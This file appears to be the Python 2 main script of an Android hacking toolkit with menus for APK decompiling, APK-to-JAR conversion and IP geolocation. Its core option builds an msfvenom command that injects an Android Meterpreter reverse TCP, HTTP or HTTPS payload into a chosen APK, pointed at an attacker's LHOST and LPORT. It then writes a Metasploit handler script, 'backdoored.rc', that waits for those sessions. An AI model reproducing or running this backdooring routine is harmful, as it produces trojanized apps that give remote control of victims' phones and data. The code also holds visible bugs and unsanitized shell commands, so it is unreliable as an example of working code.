#/usr/bin/python
# -*- coding: utf-8 -*-
import os
import shutil
import sys
import time
import progressbar
import time
import shutil

from termcolor import cprint
from colorama import init
from pyfiglet import figlet_format

from Resource.Banners import *
from Resource.DIR import *
from Resource.terminal import *
from Resource.ip_geolocator import *    

init(strip=not sys.stdout.isatty())

cls()
del_cls()
hacking()
cls()   

def start_textart():
    while '1'=='1':
        try: 
            cls()
            terminal_resize1()
            start_menu()
            choice_1 = raw_input(d_sign1)
        except KeyboardInterrupt:
            print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
            terminal_return()
            cls()
            sys.exit(0)

        while choice_1 == '1':

            def quantom():
                try:
                    os.system('apktool d -f ' + apk_file)
                    raw_input("Press Enter to continue...")
                except KeyboardInterrupt:
                    print raw_input(colored("Press Enter to Exit", 'green', attrs=['bold']))
                    terminal_return()
                    cls()
                    sys.exit(0)
                    pass
            terminal_resize3()
            os.system("python Assest/Resource/hidepyc.py " + dir_path + "/Assest/Resource")
            print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░APK DECOMPILE░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
            derp()
            print('                   ' + d_sign + 'OPTIONS' + d_sign)
            print(d1_sign + choose_directory)
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1).replace(" ", "")
            apk_file.strip()
            print(apk_file)

            if apk_file.endswith(".apk"):
                quantom()
            elif apk_file.endswith(".apk'"):
                quantom()
                pass
            elif apk_file == '0':
                    start_textart()
                    pass
            else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
            

        pass
    
        
        while choice_1 == '2':
            try:
                terminal_resize5()
                cls()
                Hello()
                print(d1_sign + choose_directory)
                print(d1_sign + eg + exampe + eg_2)
                print (a1_sign + x0 + a2_sign + back)
                apk_file = raw_input(d_sign1).replace(" ", "")
                if apk_file.endswith('.apk'):
                    if os.path.exists(apk_file) == False:
                        print (d_sign2),colored("FILE DOESN'T EXISTS", 'red', attrs=['reverse', 'bold'])
                        raw_input("Press Enter to continue...")
                        start_textart()
                    else:
                        terminal_resize8()
                        cls()
                        payload1()
                        P = raw_input("Payload" +d_sign1)
                        if P == '1':
                            P = 'android/meterpreter/reverse_tcp'
                            P_1 = 'set payload android/meterpreter/reverse_tcp\r\n'
                        elif P == '2':
                            P = 'android/meterpreter/reverse_http'
                            P_1 = 'set payload android/meterpreter/reverse_http\r\n'
                        elif P == '3':
                            P = 'android/meterpreter/reverse_https'
                            P_1 = 'set payload android/meterpreter/reverse_https\r\n'
                        else:
                            print (d_sign2), colored('Error', 'red', attrs=['reverse', 'bold'])
                            raw_input("Press Enter to continue...")
                            pass
                        pass
                        cls()
                        print('         ' + d_sign + 'OPTIONS' + d_sign)
                        LHOST = raw_input(" LHOST="+d_sign1)
                        LPORT = raw_input(" LPORT="+d_sign1)
                        cls()
                        terminal_resize6()
                        cls()
                        os.system("msfvenom -x "+ apk_file + " -p "+P + " LHOST="+LHOST + " LPORT="+LPORT + " -o "+os.path.splitext(apk_file)[0]+"_reversed.apk")
                        raw_input("Press Enter to continue...")
                        terminal_resize7()
                        cls()
                        os.system("rm -rf " + dir_path + 'Assest/Output')
                        f=open('Assest/Output/backdoored.rc',"w+")
                        f.write("use exploit/multi/handler \r\n")
                        f.write(P_1)
                        f.write("set "+ 'LHOST ' + LHOST + '\r\n')    
                        f.write("set "+ 'LPORT ' + LPORT + '\r\n')
                        f.write("exploit -j \r\n")
                        f.close()
                        cls()
                        print('The output file will be in ' + apk_file + - '.apk' + '_reversed')
                        raw_input("Press Enter to continue...")
                        cls()
                        pass

                elif apk_file.endswith(".apk'"):
                        terminal_resize8()
                        cls()
                        payload1()
                        P = raw_input("Payload" +d_sign1)
                        if P == '1':
                            P = 'android/meterpreter/reverse_tcp'
                            P_1 = 'set payload android/meterpreter/reverse_tcp\r\n'
                        elif P == '2':
                            P = 'android/meterpreter/reverse_http'
                            P_1 = 'set payload android/meterpreter/reverse_http\r\n'
                        elif P == '3':
                            P = 'android/meterpreter/reverse_https'
                            P_1 = 'set payload android/meterpreter/reverse_https\r\n'
                        else:
                            print (d_sign2), colored('Error', 'red', attrs=['reverse', 'bold'])
                            raw_input("Press Enter to continue...")
                            pass
                        pass
                        cls()
                        print('         ' + d_sign + 'OPTIONS' + d_sign)
                        LHOST = raw_input(" LHOST="+d_sign1)
                        LPORT = raw_input(" LPORT="+d_sign1)
                        cls()
                        terminal_resize6()
                        cls()
                        os.system("msfvenom -x "+ apk_file + " -p "+P + " LHOST="+LHOST + " LPORT="+LPORT + " -o "+ "Assest/Output/reversed.apk")
                        raw_input("Press Enter to continue...")
                        terminal_resize7()
                        cls()
                        #shutil.rmtree(dir_path+'Assest/Output')z
                        os.system("rm "+ dir_path +"/Assest/Output/* && touch "+ dir_path + "/Assest/Output/backdoored.rc")
                        f=open('Assest/Output/backdoored.rc',"w+")
                        f.write("use exploit/multi/handler \r\n")
                        f.write(P_1)
                        f.write("set "+ 'LHOST ' + LHOST + '\r\n')    
                        f.write("set "+ 'LPORT ' + LPORT + '\r\n')
                        f.write("set ExitOnSession false \r\n")
                        f.write("exploit -j \r\n")
                        f.close()
                        cls()
                        print('The output file will be in the same folder as the apk you choose')
                        raw_input("Press Enter to continue...")
                        cls()
                        pass
                elif apk_file == '0':
                        start_textart()
                        pass
                elif apk_file == '1':
                        print("PASS!!!!")
                        raw_input("Press Enter to continue...")
                else:
                        print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                        raw_input("Press Enter to continue...")
            except KeyboardInterrupt:
                print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
                terminal_return()
                cls()
                sys.exit(0)
        pass

        cls()
        while choice_1 =='3':
            try:
                terminal_resize4()
                print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░!APK-2-JAR!░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
                Bunny()
                print(d1_sign + choose_directory)    
                print(d1_sign + eg + exampe + eg_2)
                print (a1_sign + x0 + a2_sign + back)
                apk_file = raw_input(d_sign1).replace(" ", "")
                if apk_file.endswith('.apk'):
                        os.system('d2j-dex2jar ' + apk_file)
                        raw_input("Press Enter to continue...")
                elif apk_file == '0':
                        start_textart()
                        pass
                else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
            except KeyboardInterrupt:
                print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
                terminal_return()
                cls()
                sys.exit(0)

        pass


        cls()
        while choice_1 == '4':
            try:
                terminal_resize9()
                print colored('|---=IP Geolocation Tool=---|', 'red', attrs=['bold'])
                penguin()
                print(d1_sign + IP_E)
                print (a1_sign + x0 + a2_sign + back)
                IP = raw_input(d_sign1)
                if IP == '0':
                    start_textart()
                elif IP in aplha_1 or aplha_2:
                    os.system('python Assest/Resource/ip_geolocator.py --url ' + IP)
                    terminal_resize10()
                elif IP in num:
                    os.system('python Assest/Resource/ip_geolocator.py -t ' + IP)
                    terminal_resize10()
                else:
                    print (d_sign2), colored('UNKNOWN ERROR', 'red', attrs=['reverse', 'bold'])
                raw_input("Press Enter to continue...")
            except KeyboardInterrupt:
                print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
                terminal_return()
                cls()
                sys.exit(0)
        pass

        cls()
        while choice_1 == '5':
            try:
                terminal_return()
                cls()
                sys.exit()
            except KeyboardInterrupt:
                print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
                terminal_return()
                cls()
                sys.exit(0)
        pass
pass

def Loading():
	with progressbar.ProgressBar(max_value=100) as bar:
		for i in range(100):
			time.sleep(0.02)
			bar.update(i)
		pass
	pass
pass

def terminal_launch():
    os.system('gnome-terminal --hide-menubar')
pass

try:
    cls()
    terminal_resize2()
    hacking()
    Loading()   
    cls()
    terminal_resize1()
except KeyboardInterrupt:
    print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
    terminal_return()
    cls()
    sys.exit(0)
try:
    while start_textart():
        terminal_resize3()
        cls()
    pass
except KeyboardInterrupt:
    print raw_input( colored("Press Enter to Exit", 'green', attrs=['bold']))
    terminal_return()
    cls()
    sys.exit(0)
